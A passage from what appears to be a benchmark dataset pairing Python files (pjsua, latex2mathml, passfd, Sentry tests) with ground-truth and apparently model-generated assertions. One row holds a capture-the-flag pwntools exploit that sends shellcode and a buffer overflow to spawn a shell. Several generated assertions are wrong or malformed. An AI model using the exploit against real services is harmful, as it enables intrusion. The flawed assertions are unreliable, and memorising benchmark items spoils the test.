124        tonegen.play(tones, True)
125        tonegen.startTransmit(spk)
126        time.sleep(5)
127
128	tonegen.stop()
129        tonegen.playDigits(digits, True)
130        time.sleep(5)
131
132	dm = tonegen.getDigitMap()
133	print dm[0].digit
134	dm[0].freq1 = 400
135	dm[0].freq2 = 600
136	tonegen.setDigitMap(dm)
137	
138	tonegen.stop()
139        tonegen.playDigits(digits, True)
140        time.sleep(5)
141	
142        tonegen = None
143
144        ep.libDestroy()
145
146#
147# main()
148#
149if __name__ == ""__main__"":
150	ua_data_test()
151	ua_run_test_exception()
152	ua_run_log_test()
153	ua_run_ua_test()
154	ua_tonegen_test()
155	sys.exit(0)
156
157	
158",5203,"[[15, 'the_realm', '!=', '', ""the_realm should have a value""],
[16, 'ci.realm', '==', 'the_realm', ""the ci.realm must be set correctly""],
[17, 'ci.dataType', '==', 20, ""dataType must be set""],
[26, 'uc.maxCalls', '>=', 1, ""maxCalls should be at least 1""],
[27, 'uc.userAgent', '!=', '', ""userAgent should not be empty""],
[28, 'uc.nameserver', '!=', [], ""nameserver should not be empty""],
[44, 'ep', '!=', None, ""endpoint should be properly initialized""],
[46, 'got_exception', '==', False, ""no exception should be thrown initially""],
[68, 'ep_cfg.logConfig.writer', '!=', None, ""log writer should be initialized""],
[69, 'ep_cfg.logConfig.decor', '!=', None, ""log decorator should be initialized""],
[83, 'ep', '!=', None, ""endpoint should be properly initialized""],
[108, 'tone.freq2', '>=', 'tone.freq1', ""freq2 should be greater than or equal to freq1""],
[109, 'tone.on_msec', '>=', 1, ""on_msec should be at least 1 msec""],
[110, 'tone.off_msec', '>=', 1, ""off_msec should be at least 1 msec""],
[119, 'digits', '!=', [], 'There should be at least one digit'],
[122, 'spk', '!=', None, ""Playback device media should be properly retrieved""],
[133, 'dm[0].digit', '==', 'digit.digit', ""the digit from the digitmap should match the one that was inserted""],
[134, 'dm[0].freq1', '==', 400, ""the frequency of digit should be set to 400""],
[135, 'dm[0].freq2', '==', 600, ""the frequency of digit should be set to 600""]]"
Code-ReaQtor/latex2mathml,"#!/usr/bin/env python
# __author__ = ""Ronie Martinez""
# __copyright__ = ""Copyright 2016-2020, Ronie Martinez""
# __credits__ = [""Ronie Martinez""]
# __maintainer__ = ""Ronie Martinez""
# __email__ = ""ronmarti18@gmail.com""
import pytest

from latex2mathml.symbols_parser import convert_symbol


@pytest.mark.parametrize(
    ""name, latex, expected"",
    [(""operator plus"", ""+"", ""0002B""), (""alias command"", r""\to"", ""02192"")],
)
def test_convert_symbol(name: str, latex: str, expected: str):
    assert convert_symbol(latex) == expected
","
1#!/usr/bin/env python
2# __author__ = ""Ronie Martinez""
3# __copyright__ = ""Copyright 2016-2020, Ronie Martinez""
4# __credits__ = [""Ronie Martinez""]
5# __maintainer__ = ""Ronie Martinez""
6# __email__ = ""ronmarti18@gmail.com""
7import pytest
8
9from latex2mathml.symbols_parser import convert_symbol
10
11
12@pytest.mark.parametrize(
13    ""name, latex, expected"",
14    [(""operator plus"", ""+"", ""0002B""), (""alias command"", r""\to"", ""02192"")],
15)
16def test_convert_symbol(name: str, latex: str, expected: str):
17","[['convert_symbol(latex)', '==', 'expected']]",1,1,1.0,0.0018867924528301,"['# __author__', '# __copyright__', '# __credits__', '# __maintainer__', '# __email__', 'name: str', 'latex: str', 'expected: str']",8,"You are a helpful bot that adds assertions to pieces of Python code.
You will be given a list of variables and a string of code presented in the format:
*Variables:
[...]
*Code:
...
Generate assertions based on the following criteria:
1) Assert that the function can take in all inputs necessary to complete the process
2) Assert that all outputs are of the proper sizes.

Your response should ONLY be a list of assertions in the format:
[line_number, subject_variable, condition_type, target, reasoning]
 -line_number is an integer referencing the line after which the assertion should be inserted
 -subject_variable and target can ONLY be variables from the input list OR integers
 -condition_type can only be a value in this list: [==, >=, <=, !=]
 -reasoning is a short decription of why the assertion was made

Here is an example of what your input will look like and what you should return:
Example Input:
*Variables:
[n]
*Code:
1def fibonacci(n):
2   if n <= 1:
3       return n
4   else:
5       return(recur_fibo(n-1) + recur_fibo(n-2))
Example Output:
[1, n, >=, 1, ""the fibonacci sequence can only be done on posative integers""]

Which would be the same as:
1def fibonacci(n):
2   assert n >= 1
3   if n <= 1:
4       return n
5   else:
6       return(recur_fibo(n-1) + recur_fibo(n-2))


Here is the actual input you should provide assertions for:
*Variables:
['# __author__', '# __copyright__', '# __credits__', '# __maintainer__', '# __email__', 'name: str', 'latex: str', 'expected: str']
*Code:

1#!/usr/bin/env python
2# __author__ = ""Ronie Martinez""
3# __copyright__ = ""Copyright 2016-2020, Ronie Martinez""
4# __credits__ = [""Ronie Martinez""]
5# __maintainer__ = ""Ronie Martinez""
6# __email__ = ""ronmarti18@gmail.com""
7import pytest
8
9from latex2mathml.symbols_parser import convert_symbol
10
11
12@pytest.mark.parametrize(
13    ""name, latex, expected"",
14    [(""operator plus"", ""+"", ""0002B""), (""alias command"", r""\to"", ""02192"")],
15)
16def test_convert_symbol(name: str, latex: str, expected: str):
17",2022,"[16, 'name', '!=', '', ""name can't be an empty string""],
[16, 'latex', '!=', '', ""latex can't be an empty string""],
[16, 'expected', '!=', '', ""expected can't be an empty string""]"
mirzawaqasahmed/avocado-vt,"'''
passfd.py: Python library to pass file descriptors across UNIX domain sockets

This simple extension provides two functions to pass and receive file
descriptors across UNIX domain sockets, using the BSD-4.3+ sendmsg() and
recvmsg() interfaces.

Direct bindings to sendmsg and recvmsg are not provided, as the API does
not map nicely into Python.

Please note that this only supports BSD-4.3+ style file descriptor
passing, and was only tested on Linux. Patches are welcomed!

For more information, see one of the R. Stevens' books:
 - Richard Stevens: Unix Network Programming, Prentice Hall, 1990;
   chapter 6.10

 - Richard Stevens: Advanced Programming in the UNIX Environment,
   Addison-Wesley, 1993; chapter 15.3
'''

#
# Copyright (C) 2010 Martin Ferrari <martin.ferrari@gmail.com>
#
# This program is free software; you can redistribute it and/or modify it
# under the terms of the GNU General Public License as published by the Free
# Software Foundation; either version 2 of the License, or (at your option)
# any later version.
#
# This program is distributed in the hope that it will be useful, but WITHOUT
# ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or
# FITNESS FOR A PARTICULAR PURPOSE.  See the GNU General Public License for
# more details.
#
# You should have received a copy of the GNU General Public License along with
# this program; if not, write to the Free Software Foundation, Inc., 51
# Franklin Street, Fifth Floor, Boston, MA  02110-1301, USA.
#

import socket
import _passfd


def __check_socket(sock):
    if hasattr(sock, 'family') and sock.family != socket.AF_UNIX:
        raise ValueError(""Only AF_UNIX sockets are allowed"")

    if hasattr(sock, 'fileno'):
        sock = sock.fileno()

    if not isinstance(sock, int):
        raise TypeError(""An socket object or file descriptor was expected"")

    return sock


def __check_fd(fd):
    try:
        fd = fd.fileno()
    except AttributeError:
        pass
    if not isinstance(fd, int):
        raise TypeError(""An file object or file descriptor was expected"")

    return fd


def sendfd(sock, fd, message=""NONE""):
    """"""
    Sends a message and piggybacks a file descriptor via a Unix domain socket

    Note that the file descriptor cannot be sent by itself, at least
    one byte of payload needs to be sent also.

    :param sock: socket object or file descriptor for an `AF_UNIX` socket
    :param fd: file object or file descriptor to pass
    :param message: message to send
    :return: On success, sendfd returns the number of bytes sent, not including
             the file descriptor nor the control data.  If there was no message
             to send, 0 is returned.
    """"""
    return _passfd.sendfd(__check_socket(sock), __check_fd(fd), message)


def recvfd(sock, msg_buf=4096):
    """"""
    Receive a message and a file descriptor from a Unix domain socket.

    :param sock: file descriptor or socket object for an ``AF_UNIX`` socket
    :param buffersize: maximum message size to receive

    :return: On success, recvfd returns a tuple containing the received
             file descriptor and message

    :raise OSError: is raised if recvmsg fails
    :raise RuntimeError: is raised if the received data does not carry
           exactly one file descriptor, or if the received file descriptor
           is not valid.
    """"""
    (ret, msg) = _passfd.recvfd(__check_socket(sock), msg_buf)
    print ret
    print msg

    # -1 should raise OSError
    if ret == -2:
        raise RuntimeError(""The message received did not contain exactly one"" +
                           "" file descriptor"")
    if ret == -3:
        raise RuntimeError(""The received file descriptor is not valid"")
    assert ret >= 0

    return (ret, msg)
","
1'''
2passfd.py: Python library to pass file descriptors across UNIX domain sockets
3
4This simple extension provides two functions to pass and receive file
5descriptors across UNIX domain sockets, using the BSD-4.3+ sendmsg() and
6recvmsg() interfaces.
7
8Direct bindings to sendmsg and recvmsg are not provided, as the API does
9not map nicely into Python.
10
11Please note that this only supports BSD-4.3+ style file descriptor
12passing, and was only tested on Linux. Patches are welcomed!
13
14For more information, see one of the R. Stevens' books:
15 - Richard Stevens: Unix Network Programming, Prentice Hall, 1990;
16   chapter 6.10
17
18 - Richard Stevens: Advanced Programming in the UNIX Environment,
19   Addison-Wesley, 1993; chapter 15.3
20'''
21
22#
23# Copyright (C) 2010 Martin Ferrari <martin.ferrari@gmail.com>
24#
25# This program is free software; you can redistribute it and/or modify it
26# under the terms of the GNU General Public License as published by the Free
27# Software Foundation; either version 2 of the License, or (at your option)
28# any later version.
29#
30# This program is distributed in the hope that it will be useful, but WITHOUT
31# ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or
32# FITNESS FOR A PARTICULAR PURPOSE.  See the GNU General Public License for
33# more details.
34#
35# You should have received a copy of the GNU General Public License along with
36# this program; if not, write to the Free Software Foundation, Inc., 51
37# Franklin Street, Fifth Floor, Boston, MA  02110-1301, USA.
38#
39
40import socket
41import _passfd
42
43
44def __check_socket(sock):
45    if hasattr(sock, 'family') and sock.family != socket.AF_UNIX:
46        raise ValueError(""Only AF_UNIX sockets are allowed"")
47
48    if hasattr(sock, 'fileno'):
49        sock = sock.fileno()
50
51    if not isinstance(sock, int):
52        raise TypeError(""An socket object or file descriptor was expected"")
53
54    return sock
55
56
57def __check_fd(fd):
58    try:
59        fd = fd.fileno()
60    except AttributeError:
61        pass
62    if not isinstance(fd, int):
63        raise TypeError(""An file object or file descriptor was expected"")
64
65    return fd
66
67
68def sendfd(sock, fd, message=""NONE""):
69    """"""
70    Sends a message and piggybacks a file descriptor via a Unix domain socket
71
72    Note that the file descriptor cannot be sent by itself, at least
73    one byte of payload needs to be sent also.
74
75    :param sock: socket object or file descriptor for an `AF_UNIX` socket
76    :param fd: file object or file descriptor to pass
77    :param message: message to send
78    :return: On success, sendfd returns the number of bytes sent, not including
79             the file descriptor nor the control data.  If there was no message
80             to send, 0 is returned.
81    """"""
82    return _passfd.sendfd(__check_socket(sock), __check_fd(fd), message)
83
84
85def recvfd(sock, msg_buf=4096):
86    """"""
87    Receive a message and a file descriptor from a Unix domain socket.
88
89    :param sock: file descriptor or socket object for an ``AF_UNIX`` socket
90    :param buffersize: maximum message size to receive
91
92    :return: On success, recvfd returns a tuple containing the received
93             file descriptor and message
94
95    :raise OSError: is raised if recvmsg fails
96    :raise RuntimeError: is raised if the received data does not carry
97           exactly one file descriptor, or if the received file descriptor
98           is not valid.
99    """"""
100    (ret, msg) = _passfd.recvfd(__check_socket(sock), msg_buf)
101    print ret
102    print msg
103
104    # -1 should raise OSError
105    if ret == -2:
106        raise RuntimeError(""The message received did not contain exactly one"" +
107                           "" file descriptor"")
108    if ret == -3:
109        raise RuntimeError(""The received file descriptor is not valid"")
110
111    return (ret, msg)
112","[['ret', '>=', '0']]",1,1,1.0,0.0002653927813163,"['sock', 'fd', 'message', 'msg_buf', '(ret', 'msg)']",6,"You are a helpful bot that adds assertions to pieces of Python code.
You will be given a list of variables and a string of code presented in the format:
*Variables:
[...]
*Code:
...
Generate assertions based on the following criteria:
1) Assert that the function can take in all inputs necessary to complete the process
2) Assert that all outputs are of the proper sizes.

Your response should ONLY be a list of assertions in the format:
[line_number, subject_variable, condition_type, target, reasoning]
 -line_number is an integer referencing the line after which the assertion should be inserted
 -subject_variable and target can ONLY be variables from the input list OR integers
 -condition_type can only be a value in this list: [==, >=, <=, !=]
 -reasoning is a short decription of why the assertion was made

Here is an example of what your input will look like and what you should return:
Example Input:
*Variables:
[n]
*Code:
1def fibonacci(n):
2   if n <= 1:
3       return n
4   else:
5       return(recur_fibo(n-1) + recur_fibo(n-2))
Example Output:
[1, n, >=, 1, ""the fibonacci sequence can only be done on posative integers""]

Which would be the same as:
1def fibonacci(n):
2   assert n >= 1
3   if n <= 1:
4       return n
5   else:
6       return(recur_fibo(n-1) + recur_fibo(n-2))


Here is the actual input you should provide assertions for:
*Variables:
['sock', 'fd', 'message', 'msg_buf', '(ret', 'msg)']
*Code:

1'''
2passfd.py: Python library to pass file descriptors across UNIX domain sockets
3
4This simple extension provides two functions to pass and receive file
5descriptors across UNIX domain sockets, using the BSD-4.3+ sendmsg() and
6recvmsg() interfaces.
7
8Direct bindings to sendmsg and recvmsg are not provided, as the API does
9not map nicely into Python.
10
11Please note that this only supports BSD-4.3+ style file descriptor
12passing, and was only tested on Linux. Patches are welcomed!
13
14For more information, see one of the R. Stevens' books:
15 - Richard Stevens: Unix Network Programming, Prentice Hall, 1990;
16   chapter 6.10
17
18 - Richard Stevens: Advanced Programming in the UNIX Environment,
19   Addison-Wesley, 1993; chapter 15.3
20'''
21
22#
23# Copyright (C) 2010 Martin Ferrari <martin.ferrari@gmail.com>
24#
25# This program is free software; you can redistribute it and/or modify it
26# under the terms of the GNU General Public License as published by the Free
27# Software Foundation; either version 2 of the License, or (at your option)
28# any later version.
29#
30# This program is distributed in the hope that it will be useful, but WITHOUT
31# ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or
32# FITNESS FOR A PARTICULAR PURPOSE.  See the GNU General Public License for
33# more details.
34#
35# You should have received a copy of the GNU General Public License along with
36# this program; if not, write to the Free Software Foundation, Inc., 51
37# Franklin Street, Fifth Floor, Boston, MA  02110-1301, USA.
38#
39
40import socket
41import _passfd
42
43
44def __check_socket(sock):
45    if hasattr(sock, 'family') and sock.family != socket.AF_UNIX:
46        raise ValueError(""Only AF_UNIX sockets are allowed"")
47
48    if hasattr(sock, 'fileno'):
49        sock = sock.fileno()
50
51    if not isinstance(sock, int):
52        raise TypeError(""An socket object or file descriptor was expected"")
53
54    return sock
55
56
57def __check_fd(fd):
58    try:
59        fd = fd.fileno()
60    except AttributeError:
61        pass
62    if not isinstance(fd, int):
63        raise TypeError(""An file object or file descriptor was expected"")
64
65    return fd
66
67
68def sendfd(sock, fd, message=""NONE""):
69    """"""
70    Sends a message and piggybacks a file descriptor via a Unix domain socket
71
72    Note that the file descriptor cannot be sent by itself, at least
73    one byte of payload needs to be sent also.
74
75    :param sock: socket object or file descriptor for an `AF_UNIX` socket
76    :param fd: file object or file descriptor to pass
77    :param message: message to send
78    :return: On success, sendfd returns the number of bytes sent, not including
79             the file descriptor nor the control data.  If there was no message
80             to send, 0 is returned.
81    """"""
82    return _passfd.sendfd(__check_socket(sock), __check_fd(fd), message)
83
84
85def recvfd(sock, msg_buf=4096):
86    """"""
87    Receive a message and a file descriptor from a Unix domain socket.
88
89    :param sock: file descriptor or socket object for an ``AF_UNIX`` socket
90    :param buffersize: maximum message size to receive
91
92    :return: On success, recvfd returns a tuple containing the received
93             file descriptor and message
94
95    :raise OSError: is raised if recvmsg fails
96    :raise RuntimeError: is raised if the received data does not carry
97           exactly one file descriptor, or if the received file descriptor
98           is not valid.
99    """"""
100    (ret, msg) = _passfd.recvfd(__check_socket(sock), msg_buf)
101    print ret
102    print msg
103
104    # -1 should raise OSError
105    if ret == -2:
106        raise RuntimeError(""The message received did not contain exactly one"" +
107                           "" file descriptor"")
108    if ret == -3:
109        raise RuntimeError(""The received file descriptor is not valid"")
110
111    return (ret, msg)
112",5409,"[[68, 'sock', '!=', None, ""Function sendfd can't accept None as socket""],
 [68, 'fd', '!=', None, ""Function sendfd can't accept None as file descriptor""],
 [68, 'message', '!=', None, ""Function sendfd can't accept None as message""],
 [85, 'sock', '!=', None, ""Function recvfd can't accept None as socket""],
 [85, 'msg_buf', '>=', 0, ""Function recvfd can't accept negative numbers as buffer size""],
 [111, '(ret', 'msg)', '!=', None, ""Return values from recvfd function can't be None""]]"
sigma-random/pwntools-write-ups,"#!/usr/bin/env python
from pwn import *
context(os='linux', arch='i386')

# If a HOST is given on the cmdline, then assume that it is already running there
if 'HOST' in pwn.args:
    HOST = pwn.args['HOST']
    PORT = int(pwn.args.get('PORT', 7777))
else:
    # Otherwise start the binary locally
    HOST = 'localhost'
    PORT = 7777
    process('./5b7420a5bcdc1da85bccc62dcea4c7b8')
    sleep(0.1)

r = remote('localhost', 7777, timeout=0.5)
r.clean(1)

# File Descriptors:
# 0,1,2: Std In/Out/Err
# 3: Listenfd
# 4: Clientfd
shellcode = asm(shellcraft.dupsh(4))

### Send shellcode to get base64 back
log.info(""Sending shellcode"")
r.sendline('base64 encode')
r.clean(1)
r.sendline(shellcode)
encoded_shellcode = r.recvrepeat().strip()
r.sendline('')

### Move shellcode buffer to predictable location
log.info(""Retrieving shellcode to copy it into static buffer"")
r.sendline('base64 decode')
r.clean(1)
r.sendline(encoded_shellcode)
shellcode_back = r.recvrepeat().strip()
assert shellcode == shellcode_back
r.sendline('')

### Overflow
overflow = 'A'*(0xef)     # bytes required to hit return address
overflow += p32(0x0804F0E0) # decode buffer

log.info(""Sending overflow:\n%s"" % hexdump(overflow))
r.sendline('write ' + overflow)
r.clean(1)

log.info(""Shell spawned..."")
r.interactive()
","
1#!/usr/bin/env python
2from pwn import *
3context(os='linux', arch='i386')
4
5# If a HOST is given on the cmdline, then assume that it is already running there
6if 'HOST' in pwn.args:
7    HOST = pwn.args['HOST']
8    PORT = int(pwn.args.get('PORT', 7777))
9else:
10    # Otherwise start the binary locally
11    HOST = 'localhost'
12    PORT = 7777
13    process('./5b7420a5bcdc1da85bccc62dcea4c7b8')
14    sleep(0.1)
15
16r = remote('localhost', 7777, timeout=0.5)
17r.clean(1)
18
19# File Descriptors:
20# 0,1,2: Std In/Out/Err
21# 3: Listenfd
22# 4: Clientfd
23shellcode = asm(shellcraft.dupsh(4))
24
25### Send shellcode to get base64 back
26log.info(""Sending shellcode"")
27r.sendline('base64 encode')
28r.clean(1)
29r.sendline(shellcode)
30encoded_shellcode = r.recvrepeat().strip()
31r.sendline('')
32
33### Move shellcode buffer to predictable location
34log.info(""Retrieving shellcode to copy it into static buffer"")
35r.sendline('base64 decode')
36r.clean(1)
37r.sendline(encoded_shellcode)
38shellcode_back = r.recvrepeat().strip()
39r.sendline('')
40
41### Overflow
42overflow = 'A'*(0xef)     # bytes required to hit return address
43overflow += p32(0x0804F0E0) # decode buffer
44
45log.info(""Sending overflow:\n%s"" % hexdump(overflow))
46r.sendline('write ' + overflow)
47r.clean(1)
48
49log.info(""Shell spawned..."")
50r.interactive()
51","[['shellcode', '==', 'shellcode_back']]",1,1,1.0,0.0007727975270479,"['HOST', 'PORT', 'r', 'shellcode', 'encoded_shellcode', 'shellcode_back', 'overflow']",7,"You are a helpful bot that adds assertions to pieces of Python code.
You will be given a list of variables and a string of code presented in the format:
*Variables:
[...]
*Code:
...
Generate assertions based on the following criteria:
1) Assert that the function can take in all inputs necessary to complete the process
2) Assert that all outputs are of the proper sizes.

Your response should ONLY be a list of assertions in the format:
[line_number, subject_variable, condition_type, target, reasoning]
 -line_number is an integer referencing the line after which the assertion should be inserted
 -subject_variable and target can ONLY be variables from the input list OR integers
 -condition_type can only be a value in this list: [==, >=, <=, !=]
 -reasoning is a short decription of why the assertion was made

Here is an example of what your input will look like and what you should return:
Example Input:
*Variables:
[n]
*Code:
1def fibonacci(n):
2   if n <= 1:
3       return n
4   else:
5       return(recur_fibo(n-1) + recur_fibo(n-2))
Example Output:
[1, n, >=, 1, ""the fibonacci sequence can only be done on posative integers""]

Which would be the same as:
1def fibonacci(n):
2   assert n >= 1
3   if n <= 1:
4       return n
5   else:
6       return(recur_fibo(n-1) + recur_fibo(n-2))


Here is the actual input you should provide assertions for:
*Variables:
['HOST', 'PORT', 'r', 'shellcode', 'encoded_shellcode', 'shellcode_back', 'overflow']
*Code:

1#!/usr/bin/env python
2from pwn import *
3context(os='linux', arch='i386')
4
5# If a HOST is given on the cmdline, then assume that it is already running there
6if 'HOST' in pwn.args:
7    HOST = pwn.args['HOST']
8    PORT = int(pwn.args.get('PORT', 7777))
9else:
10    # Otherwise start the binary locally
11    HOST = 'localhost'
12    PORT = 7777
13    process('./5b7420a5bcdc1da85bccc62dcea4c7b8')
14    sleep(0.1)
15
16r = remote('localhost', 7777, timeout=0.5)
17r.clean(1)
18
19# File Descriptors:
20# 0,1,2: Std In/Out/Err
21# 3: Listenfd
22# 4: Clientfd
23shellcode = asm(shellcraft.dupsh(4))
24
25### Send shellcode to get base64 back
26log.info(""Sending shellcode"")
27r.sendline('base64 encode')
28r.clean(1)
29r.sendline(shellcode)
30encoded_shellcode = r.recvrepeat().strip()
31r.sendline('')
32
33### Move shellcode buffer to predictable location
34log.info(""Retrieving shellcode to copy it into static buffer"")
35r.sendline('base64 decode')
36r.clean(1)
37r.sendline(encoded_shellcode)
38shellcode_back = r.recvrepeat().strip()
39r.sendline('')
40
41### Overflow
42overflow = 'A'*(0xef)     # bytes required to hit return address
43overflow += p32(0x0804F0E0) # decode buffer
44
45log.info(""Sending overflow:\n%s"" % hexdump(overflow))
46r.sendline('write ' + overflow)
47r.clean(1)
48
49log.info(""Shell spawned..."")
50r.interactive()
51",2818,"[[6, 'HOST', '!=', '', 'HOST should be defined for connection'], 
 [8, 'PORT', '>=', 1, 'PORT should be greater than or equal to 1 for valid socket communication'],
 [16, 'r', '!=', '', 'remote object should be initialized for connection'], 
 [24, 'shellcode', '!=', '', 'shellcode should be defined to execute commands'], 
 [30, 'encoded_shellcode', '!=', '', 'encoded_shellcode should be defined after getting base64 back'], 
 [38, 'shellcode_back', '!=', '', 'shellcode_back should hold the result of decode instruction'], 
 [42, 'overflow', '!=', '', 'overflow is used to outflank security measures by overwriting memory. It should be defined for this attack']]"
nicholasserra/sentry,"from __future__ import absolute_import

import pytest

from sentry.api.paginator import (
    DateTimePaginator, OffsetPaginator
)
from sentry.models import User
from sentry.testutils import TestCase


class OffsetPaginatorTest(TestCase):
    # offset paginator does not support dynamic limits on is_prev
    def test_simple(self):
        res1 = self.create_user('foo@example.com')
        res2 = self.create_user('bar@example.com')
        res3 = self.create_user('baz@example.com')

        queryset = User.objects.all()

        paginator = OffsetPaginator(queryset, 'id')
        result1 = paginator.get_result(limit=1, cursor=None)
        assert len(result1) == 1, result1
        assert result1[0] == res1
        assert result1.next
        assert not result1.prev

        result2 = paginator.get_result(limit=1, cursor=result1.next)
        assert len(result2) == 1, (result2, list(result2))
        assert result2[0] == res2
        assert result2.next
        assert result2.prev

        result3 = paginator.get_result(limit=1, cursor=result2.next)
        assert len(result3) == 1, result3
        assert result3[0] == res3
        assert not result3.next
        assert result3.prev

        result4 = paginator.get_result(limit=1, cursor=result3.next)
        assert len(result4) == 0, result4
        assert not result4.next
        assert result4.prev

        result5 = paginator.get_result(limit=1, cursor=result4.prev)
        assert len(result5) == 1, result5
        assert result5[0] == res3
        assert not result5.next
        assert result5.prev


class DateTimePaginatorTest(TestCase):
    @pytest.mark.xfail
    def test_simple(self):
        res1 = self.create_user('foo@example.com')
        res2 = self.create_user('bar@example.com')
        res3 = self.create_user('baz@example.com')

        queryset = User.objects.all()

        paginator = DateTimePaginator(queryset, 'date_joined')
        result1 = paginator.get_result(limit=1, cursor=None)
        assert len(result1) == 1, result1
        assert result1[0] == res1
        assert result1.next
        assert not result1.prev

        result2 = paginator.get_result(limit=2, cursor=result1.next)
        assert len(result2) == 2, result2
        assert result2[0] == res2
        assert result2[1] == res3
        assert not result2.next
        assert result2.prev

        # this is not yet correct
        result3 = paginator.get_result(limit=2, cursor=result2.prev)
        assert len(result3) == 1, list(result3)
        assert result3[0] == res1
        assert result3.next
        assert not result3.prev
","
1from __future__ import absolute_import
2
3import pytest
4
5from sentry.api.paginator import (
6    DateTimePaginator, OffsetPaginator
7)
8from sentry.models import User
9from sentry.testutils import TestCase
10
11
12class OffsetPaginatorTest(TestCase):
13    # offset paginator does not support dynamic limits on is_prev
14    def test_simple(self):
15        res1 = self.create_user('foo@example.com')
16        res2 = self.create_user('bar@example.com')
17        res3 = self.create_user('baz@example.com')
18
19        queryset = User.objects.all()
20
21        paginator = OffsetPaginator(queryset, 'id')
22        result1 = paginator.get_result(limit=1, cursor=None)
23
24        result2 = paginator.get_result(limit=1, cursor=result1.next)
25
26        result3 = paginator.get_result(limit=1, cursor=result2.next)
27
28        result4 = paginator.get_result(limit=1, cursor=result3.next)
29
30        result5 = paginator.get_result(limit=1, cursor=result4.prev)
31
32
33class DateTimePaginatorTest(TestCase):
34    @pytest.mark.xfail
35    def test_simple(self):
36        res1 = self.create_user('foo@example.com')
37        res2 = self.create_user('bar@example.com')
38        res3 = self.create_user('baz@example.com')
39
40        queryset = User.objects.all()
41
42        paginator = DateTimePaginator(queryset, 'date_joined')
43        result1 = paginator.get_result(limit=1, cursor=None)
44
45        result2 = paginator.get_result(limit=2, cursor=result1.next)
46
47        # this is not yet correct
48        result3 = paginator.get_result(limit=2, cursor=result2.prev)
49","[['len(result1)', '==', '1'], ['result1[0]', '==', 'res1'], ['result1.next', '==', 'True'], ['result1.prev', '==', 'False'], ['len(result2)', '==', '1'], ['result2[0]', '==', 'res2'], ['result2.next', '==', 'True'], ['result2.prev', '==', 'True'], ['len(result3)', '==', '1'], ['result3[0]', '==', 'res3'], ['result3.next', '==', 'False'], ['result3.prev', '==', 'True'], ['len(result4)', '==', '0'], ['result4.next', '==', 'False'], ['result4.prev', '==', 'True'], ['len(result5)', '==', '1'], ['result5[0]', '==', 'res3'], ['result5.next', '==', 'False'], ['result5.prev', '==', 'True'], ['len(result1)', '==', '1'], ['result1[0]', '==', 'res1'], ['result1.next', '==', 'True'], ['result1.prev', '==', 'False'], ['len(result2)', '==', '2'], ['result2[0]', '==', 'res2'], ['result2[1]', '==', 'res3'], ['result2.next', '==', 'False'], ['result2.prev', '==', 'True'], ['len(result3)', '==', '1'], ['result3[0]', '==', 'res1'], ['result3.next', '==', 'True'], ['result3.prev', '==', 'False']]",32,32,1.0,0.0122746451860375,"['res1', 'res2', 'res3', 'queryset', 'paginator', 'result1', 'result2', 'result3', 'result4', 'result5']",10,"You are a helpful bot that adds assertions to pieces of Python code.
You will be given a list of variables and a string of code presented in the format:
*Variables:
[...]
*Code:
...
Generate assertions based on the following criteria:
1) Assert that the function can take in all inputs necessary to complete the process
2) Assert that all outputs are of the proper sizes.

Your response should ONLY be a list of assertions in the format:
[line_number, subject_variable, condition_type, target, reasoning]
 -line_number is an integer referencing the line after which the assertion should be inserted
 -subject_variable and target can ONLY be variables from the input list OR integers
 -condition_type can only be a value in this list: [==, >=, <=, !=]
 -reasoning is a short decription of why the assertion was made

Here is an example of what your input will look like and what you should return:
Example Input:
*Variables:
[n]
*Code:
1def fibonacci(n):
2   if n <= 1:
3       return n
4   else:
5       return(recur_fibo(n-1) + recur_fibo(n-2))
Example Output:
[1, n, >=, 1, ""the fibonacci sequence can only be done on posative integers""]

Which would be the same as:
1def fibonacci(n):
2   assert n >= 1
3   if n <= 1:
4       return n
5   else:
6       return(recur_fibo(n-1) + recur_fibo(n-2))


Here is the actual input you should provide assertions for:
*Variables:
['res1', 'res2', 'res3', 'queryset', 'paginator', 'result1', 'result2', 'result3', 'result4', 'result5']
*Code:

1from __future__ import absolute_import
2
3import pytest
4
5from sentry.api.paginator import (
6    DateTimePaginator, OffsetPaginator
7)
8from sentry.models import User
9from sentry.testutils import TestCase
10
11
12class OffsetPaginatorTest(TestCase):
13    # offset paginator does not support dynamic limits on is_prev
14    def test_simple(self):
15        res1 = self.create_user('foo@example.com')
16        res2 = self.create_user('bar@example.com')
17        res3 = self.create_user('baz@example.com')
18
19        queryset = User.objects.all()
20
21        paginator = OffsetPaginator(queryset, 'id')
22        result1 = paginator.get_result(limit=1, cursor=None)
23
24        result2 = paginator.get_result(limit=1, cursor=result1.next)
25
26        result3 = paginator.get_result(limit=1, cursor=result2.next)
27
28        result4 = paginator.get_result(limit=1, cursor=result3.next)
29
30        result5 = paginator.get_result(limit=1, cursor=result4.prev)
31
32
33class DateTimePaginatorTest(TestCase):
34    @pytest.mark.xfail
35    def test_simple(self):
36        res1 = self.create_user('foo@example.com')
37        res2 = self.create_user('bar@example.com')
38        res3 = self.create_user('baz@example.com')
39
40        queryset = User.objects.all()
41
42        paginator = DateTimePaginator(queryset, 'date_joined')
43        result1 = paginator.get_result(limit=1, cursor=None)
44
45        result2 = paginator.get_result(limit=2, cursor=result1.next)
46
47        # this is not yet correct
48        result3 = paginator.get_result(limit=2, cursor=result2.prev)
49",3074,"[[15, 'res1', '!=', 'None', 'User creation should return a user object'],
 [16, 'res2', '!=', 'None', 'User creation should return a user object'],
 [17, 'res3', '!=', 'None', 'User creation should return a user object'],
 [22, 'result1', '!=', 'None', 'Paginator should return a result set'],
 [22, 'len(result1.results)', '==', 1, 'Limit for get_result was set to 1'],
 [24, 'result2', '!=', 'None', 'Paginator should return a result set'],
 [24, 'len(result2.results)', '==', 1, 'Limit for get_result was set to 1'],
 [26, 'result3', '!=', 'None', 'Paginator should return a result set'],
 [26, 'len(result3.results)', '==', 1, 'Limit for get_result was set to 1'],
 [28, 'result4', '!=', 'None', 'Paginator should return a result set'],
 [28, 'len(result4.results)', '==', 1, 'Limit for get_result was set to 1'],
 [30, 'result5', '!=', 'None', 'Paginator should return a result set'],
 [30, 'len(result5.results)', '==', 1, 'Limit for get_result was set to 1'],
 [36, 'res1', '!=', 'None', 'User creation should return a user object'],
 [37, 'res2', '!=', 'None', 'User creation should return a user object'],
 [38, 'res3', '!=', 'None', 'User creation should return a user object'],
 [43, 'result1', '!=', 'None', 'Paginator should return a result set'],
 [43, 'len(result1.results)', '==', 1, 'Limit for get_result was set to 1'],
 [45, 'result2', '!=', 'None', 'Paginator should return a result set'],
